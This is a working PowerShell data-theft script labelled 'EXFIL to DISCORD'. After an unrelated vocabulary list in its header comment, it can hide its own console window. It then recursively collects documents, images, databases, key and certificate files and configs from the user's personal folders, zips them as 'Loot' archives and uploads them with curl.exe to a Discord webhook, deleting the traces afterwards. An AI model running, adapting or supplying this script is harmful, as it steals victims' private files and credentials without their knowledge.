<# ============================================ EXFIL to DISCORD =================================================

Ablaze – On fire; brightly burning with intensity.

Banter – Playful, teasing talk between close friends.

Crisp – Firm, dry, and easily breakable texture.

Dapper – Stylish, neat man with elegant appearance.

Elicit – Draw out a response or reaction.

Fathom – Understand something deeply, often abstractly.

Glimpse – Quick, brief look without full details.

Havoc – Widespread destruction; total chaos and disorder.

Imbue – Fill or inspire with certain feelings.

Jovial – Cheerful, friendly, full of good humor.

Keen – Sharp, eager, or intellectually perceptive mind.

Lurk – Remain hidden, waiting to spring forth.

Mirth – Amusement expressed through laughter or cheerfulness.

Nimble – Quick and light in movement or action.

#>

$hookurl = "$dc"
if ($hookurl.Length -lt 120){
	$hookurl = ("https://discord.com/api/webhooks/" + "$dc")
}


# Uncomment $hide='y' below to hide the console

# $hide='y'
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
    if($w -ne [System.IntPtr]::Zero){
        $t::ShowWindowAsync($w,0)
    }else{
        $Host.UI.RawUI.WindowTitle = 'xx'
        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
        $w=$p.MainWindowHandle
        $t::ShowWindowAsync($w,0)
    }
}


Function FindAndSend {

param ([string[]]$FileType,[string[]]$Path)
$maxZipFileSize = 10MB
$currentZipSize = 0
$index = 1
$zipFilePath ="$env:temp/Loot$index.zip"

If($Path -ne $null){
$foldersToSearch = "$env:USERPROFILE\"+$Path
}else{
$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
}

If($FileType -ne $null){
$fileExtensions = "*."+$FileType
}else {
$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')

foreach ($folder in $foldersToSearch) {
    foreach ($extension in $fileExtensions) {
        $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
        foreach ($file in $files) {
            $fileSize = $file.Length
            if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                $zipArchive.Dispose()
                $currentZipSize = 0
                curl.exe -F file1=@"$zipFilePath" $hookurl
                Remove-Item -Path $zipFilePath -Force
                Sleep 1
                $index++
                $zipFilePath ="$env:temp/Loot$index.zip"
                $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
            }
            $entryName = $file.FullName.Substring($folder.Length + 1)
            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
            $currentZipSize += $fileSize
        }
    }
}
$zipArchive.Dispose()
curl.exe -F file1=@"$zipFilePath" $hookurl
Remove-Item -Path $zipFilePath -Force
Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
}

FindAndSend 
